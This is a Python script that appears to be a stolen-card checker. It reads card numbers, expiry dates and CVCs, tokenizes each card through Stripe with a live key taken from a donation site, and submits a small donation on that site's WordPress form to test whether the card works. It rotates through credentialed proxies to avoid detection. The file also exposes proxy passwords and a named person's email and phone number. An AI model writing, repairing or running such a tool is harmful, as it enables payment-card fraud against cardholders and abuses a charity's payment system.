import requests, re
import random
import itertools
import time

# ===== Proxy Configuration =====
PROXIES_LIST = [
    "p102.instantproxies.com:9207:9013:wBZ6YFPOkt4b",
    "p101.instantproxies.com:9207:9012:RP1vGZQZhhlK",
    "p103.instantproxies.com:9206:9011:ufrvfyLUDAK4",
]

def _build_proxy_dict(proxy_str):
    parts = proxy_str.strip().split(":")
    host, port, user, pwd = parts
    proxy_url = f"http://{user}:{pwd}@{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}

_proxy_cycle = itertools.cycle(PROXIES_LIST)

def _get_next_proxy():
    return _build_proxy_dict(next(_proxy_cycle))

# =================================

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:  # Mo3gza
        yy = yy.split("20")[1]
    r = requests.session()

    random_amount1 = random.randint(1, 4)
    random_amount2 = random.randint(1, 99)

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    # ★ f ထည့်ထားပြီး (မူရင်းမှာ မပါလို့ KeyError ဖြစ်ခဲ့တာ)
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fd98a11824e%3B+stripe-js-v3%2Fd98a11824e%3B+card-element&referrer=https%3A%2F%2Fyhwheden.com&time_on_page=126544&client_attribution_metadata[client_session_id]=bff4782b-b4f0-4456-af29-3452247ddba1&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=006b5e08-afbc-46a6-ba54-ad8c60d60165&key=pk_live_51SwTaRDh3A50axf0KU3msyExwxqGDb6jaqsmQlLubC8IxSK3LmXnlNIZVV1kB6SEQ3f72xa2qo3qryO2GxCGbIHc00MZrNI8VT'

    site_headers = {
        'authority': 'yhwheden.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://yhwheden.com',
        'referer': 'https://yhwheden.com/donate/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        't': '1794477490569',
    }

    # ★ Proxy နဲ့ ၂ ကြိမ် စမ်း၊ မရရင် direct စမ်း
    result = "Declined"
    success = False
    for attempt in range(3):
        try:
            if attempt < 2:
                proxies = _get_next_proxy()
            else:
                proxies = None  # Proxy အားလုံး ပျက်ရင် Direct

            # ---- Stripe payment_methods ----
            response = requests.post('https://api.stripe.com/v1/payment_methods',
                                     headers=headers, data=data,
                                     proxies=proxies, timeout=15)

            try:
                resp_json = response.json()
            except Exception:
                resp_json = {}

            if 'error' in resp_json:
                err = resp_json['error']
                code = err.get('code', 'unknown')
                msg = err.get('message', 'No message')
                result = f"DECLINED [{code}]: {msg}"
                success = True
                break

            if 'id' not in resp_json:
                result = f"STRIPE_NO_ID: {str(resp_json)[:150]}"
                success = True
                break

            pm = resp_json['id']

            # ---- site charge ----
            data = {
                'data': f'__fluent_form_embded_post_id=591&_fluentform_4_fluentformnonce=94b43a52ec&_wp_http_referer=%2Fdonate%2F&names%5Bfirst_name%5D=Thant%20Zin%20&names%5Blast_name%5D=Maung&email=sattlin10%40gmail.com&phone=%2B14132254697&input_radio=One%20Time&payment_input=Custom%20Amount&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id={pm}',
                'action': 'fluentform_submit',
                'form_id': '4',
            }

            response = requests.post('https://yhwheden.com/wp-admin/admin-ajax.php',
                                     params=params, headers=site_headers, data=data,
                                     proxies=proxies, timeout=15)
            result = response.text
            success = True
            break

        except Exception as e:
            print(f"Attempt {attempt + 1} Failed: {type(e).__name__}")
            time.sleep(1)

    if not success:
        result = "API Error (Network/Proxy Failed)"

    return result